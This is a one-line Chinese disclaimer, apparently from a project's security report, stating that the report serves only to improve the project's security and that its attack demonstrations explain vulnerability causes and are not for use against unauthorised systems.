*本報告僅供本專案的安全改善之用。所有攻擊示範皆為說明漏洞成因，請勿用於未經授權的系統。*
